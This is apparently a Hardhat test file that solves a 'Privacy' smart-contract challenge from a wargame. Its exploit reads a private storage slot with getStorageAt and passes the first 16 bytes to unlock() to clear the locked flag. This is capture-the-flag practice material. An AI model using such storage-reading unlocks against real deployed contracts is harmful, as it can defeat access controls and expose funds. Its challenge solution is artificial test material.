const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Privacy', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Privacy');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Privacy', deployer);
            let bytes = (n) => ethers.utils.formatBytes32String("string" + n);
            let data = [bytes("111"), bytes("222"), bytes("333")];
            this.target = await ContractFactory.deploy(data);
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        let key = await ethers.provider.getStorageAt(this.target.address, 5); //data[2]
        console.log(`\t key  : ${key}`);
        let key16 = ethers.utils.hexDataSlice(key, 0, 16);
        console.log(`\t key16: ${key16}`);
        let unlockTX = await this.target.connect(attacker).unlock(key16); await unlockTX.wait();
        console.log(`\t locked: ${await this.target.locked()}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.locked()).to.be.eq(false);
    });
});